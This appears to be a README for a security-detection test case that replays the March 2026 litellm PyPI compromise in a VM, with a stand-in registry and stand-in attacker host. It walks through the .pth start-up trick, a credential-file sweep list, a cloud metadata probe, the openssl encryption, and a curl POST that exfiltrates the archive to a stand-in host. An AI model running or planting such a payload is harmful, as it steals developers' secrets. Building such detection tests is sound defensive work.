# LiteLLM compromise

The PyPI compromise of March 2026: two releases of `litellm` uploaded with a
stolen maintainer credential, the second carrying a `.pth` file, which Python
runs at every interpreter start. It started a payload that swept the machine
for credentials, encrypted what it found and posted it to a host named to
look like the project's own.

The recording is of a developer's Mac (a VM) where the person makes a
virtualenv, types `pip install acme-tokens` and runs Python once, and of
nothing else they do.

## What happens in the recording

| step | what the sensor sees | from the write-ups |
|---|---|---|
| 1 | `pip install` unpacks the wheel: `acme_tokens_init.pth` is written at the top of the virtualenv's `site-packages` | the second release's wheel (StepSecurity, the maintainers' notice) |
| 2 | the person's `python` starts another `python -c ...` with no output, which outlives it | the `.pth` line: `subprocess.Popen([sys.executable, "-c", ...])` (StepSecurity, OpenSourceMalware) |
| 3 | that Python writes a script to a temporary directory and runs it with the same interpreter | the first stage writes the collector out and runs it (JFrog) |
| 4 | the collector runs `hostname; pwd; whoami; uname -a; ifconfig` and `printenv` through a shell, then opens the SSH keys, `~/.aws/`, `~/.kube/config`, the gcloud, Azure and Docker files, `~/.npmrc`, `~/.netrc`, `~/.git-credentials`, the shell histories, wallet files and `/etc/passwd`, and looks for `.env` files under `/opt` and the other roots, six levels down | the collector's commands and file list (StepSecurity, Trend Micro, OpenSourceMalware) |
| 5 | a connection attempt to `169.254.169.254` port 80 | the cloud metadata service, asked for a token (StepSecurity, Trend Micro) |
| 6 | `openssl rand`, `openssl enc -aes-256-cbc ... -pbkdf2`, `openssl pkeyutl -encrypt ... rsa_padding_mode:oaep`, `tar -czf`, all children of the first stage, on files in the temporary directory | the session key, the encryption and the archive (JFrog, Snyk) |
| 7 | `curl -s -o /dev/null -X POST https://models.acme-tokens.example/ ... --data-binary @bundle.tar.gz`, about 260 kB to port 443 | the upload (JFrog, StepSecurity) |

`twin.sh` is the same kinds of acts by the person on their own work: a
virtualenv, `pip install` of real packages that put a `.pth` file of their own
in `site-packages` (setuptools and coverage), and Python run afterwards.

## What is real and what is stood in

Real: every program, every file read and written, every process's parent,
`pip install` itself, the `.pth` file run by Python's own `site` module, the
`openssl`, `tar` and `curl` command lines as the write-ups give them.

Stood in:

- **PyPI.** `pypi.org` and `files.pythonhosted.org` in the VM are
  [`standin/registry.py`](../../standin/registry.py) on the host, so the
  connections carry PyPI's names and a private address. The infected wheel
  comes from it; every other project is passed through from the real PyPI.
- **The attacker's host.** `models.acme-tokens.example` is the same stand-in,
  which answers 200 and keeps nothing.
- **What is sent.** Nothing the collector reads is kept or sent. What is
  encrypted, packed and posted is 256 kB of random bytes; the size of a real
  sweep is not given in the write-ups, and this is a guess at it. The public
  key it is encrypted to has no private half: it was thrown away when the
  case was written.
- **The credentials.** Random bytes in the right files and shapes, made when
  the VM is provisioned.
- **The names.** The package (`acme-tokens`), the `.pth` file, the temporary
  files and the archive are made up; the incident's own file names and hosts
  are not used, so that nothing is caught by a name.
- **The payload's form.** The real `.pth` line carried the whole payload,
  base64 twice over, in its `-c` argument. Here the line is plain and the
  argument is `import acme_tokens._start`, a file in the package.
- **One payload, not a runaway.** The Python the real `.pth` line started
  read the `.pth` file too and started another, without end: the machine
  filling with processes is how it was noticed (Snyk, Trend Micro). Here the
  started Python is marked by an environment variable and starts no other.

Filled with the plainest thing, where the write-ups give no detail: which
wallet files (three globs), and where the search for `.pem` and `.key` files
starts (only `/etc/ssl/private`, which a Mac does not have).

Not in the recording:

- **Persistence.** The write-ups describe only Linux persistence: a script at
  `~/.config/sysmon/sysmon.py` kept running by a systemd user unit, polling a
  second host for something to download and run. None says what the installer
  does where there is no systemd, and none gives a macOS mechanism, so
  nothing is installed here.
- **Kubernetes.** With a service-account token the payload read every
  namespace's secrets and put a privileged pod on each node. A developer's
  Mac has no such token; the token's path is tried and that is all.
- **The cloud calls.** With AWS credentials the real payload asked Secrets
  Manager and the parameter store for what they hold. The planted keys are
  not tried against anyone.
- **The first release's way in**, a payload in the package's proxy module
  that ran on import rather than at start-up.

The payload runs only on a recording VM (`/etc/tangent-eval-vm`, and a
`models.acme-tokens.example` that resolves to a private address) and exits at
once anywhere else.

## Needs in the VM

Nothing installed. `record.sh` writes pip's machine-wide config
(`/Library/Application Support/pip/pip.conf`, `cert = /etc/tangent-eval-ca.pem`)
before the capture, so pip trusts the stand-in. Two things to know about the
VM's `python3`: it must be able to make a virtualenv with pip in it
(Homebrew's and the command line tools' both can), and the twin's coverage
ships its `.pth` file only in releases that need Python 3.11 or later; on an
older `python3` the twin still gets setuptools' one.

## Sources

See [`case.json`](case.json).
